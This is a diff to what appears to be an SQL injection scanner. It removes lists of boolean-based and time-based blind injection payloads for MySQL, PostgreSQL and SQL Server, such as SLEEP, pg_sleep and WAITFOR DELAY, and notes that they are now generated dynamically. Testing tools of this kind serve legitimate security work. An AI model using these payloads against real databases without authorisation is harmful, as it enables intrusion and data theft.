@@ -66,40 +66,8 @@ ERROR_BASED_PAYLOADS = [
     (" ORDER BY 1", "ORDER_BY"),
 ]
 
-# Payloads for Boolean-Based Blind SQLi.
-# Each tuple is (true_payload, false_payload, family_tag)
-BOOLEAN_BASED_PAYLOADS = [
-    (" AND 1=1", " AND 1=2", "LOGICAL"),
-    (" OR 1=1", " OR 1=2", "LOGICAL"),
-    (" AND 'a'='a'", " AND 'a'='b'", "COMPARISON_STR"),
-    (" OR 'a'='a'", " OR 'a'='b'", "COMPARISON_STR"),
-    (" AND 1=1-- ", " AND 1=2-- ", "LOGICAL_COMMENT"),
-    (" OR 1=1-- ", " OR 1=2-- ", "LOGICAL_COMMENT"),
-    ("' AND 1=1-- ", "' AND 1=2-- ", "LOGICAL_COMMENT_QUOTED"),
-    ("' OR 1=1-- ", "' OR 1=2-- ", "LOGICAL_COMMENT_QUOTED"),
-    (" AND 1 LIKE 1", " AND 1 LIKE 2", "COMPARISON_LIKE"),
-]
-
-# Payloads for Time-Based Blind SQLi.
-# Each tuple is (payload_string, sleep_duration, family_tag)
-TIME_BASED_PAYLOADS = [
-    # MySQL / MariaDB
-    ("AND SLEEP({sleep})", 5, "MYSQL_SLEEP"),
-    ("OR SLEEP({sleep})", 5, "MYSQL_SLEEP"),
-    ("AND (SELECT * FROM (SELECT(SLEEP({sleep})))a)", 5, "MYSQL_SLEEP_SUBSELECT"),
-    ("' AND SLEEP({sleep}) AND '1'='1", 5, "MYSQL_SLEEP"),
-    ("AND BENCHMARK({sleep}000000,MD5(1))", 5, "MYSQL_BENCHMARK"),
-    ("OR BENCHMARK({sleep}000000,MD5(1))", 5, "MYSQL_BENCHMARK"),
-
-    # PostgreSQL
-    ("AND (SELECT pg_sleep({sleep}))", 5, "PGSQL_SLEEP"),
-    ("' AND (SELECT pg_sleep({sleep})) AND '1'='1", 5, "PGSQL_SLEEP"),
-    ("pg_sleep({sleep})", 5, "PGSQL_SLEEP"),
-
-    # SQL Server
-    ("AND WAITFOR DELAY '0:0:{sleep}'", 5, "MSSQL_WAITFOR"),
-    ("' AND WAITFOR DELAY '0:0:{sleep}' AND '1'='1", 5, "MSSQL_WAITFOR"),
-]
+# NOTE: BOOLEAN_BASED_PAYLOADS and TIME_BASED_PAYLOADS have been migrated
+# to the new AstPayloadGenerator and are now generated dynamically.
 
 # MSSQL Specific Payloads (b64 encoded)
 MSSQL_ERROR_BASED_PAYLOADS_B64 = [
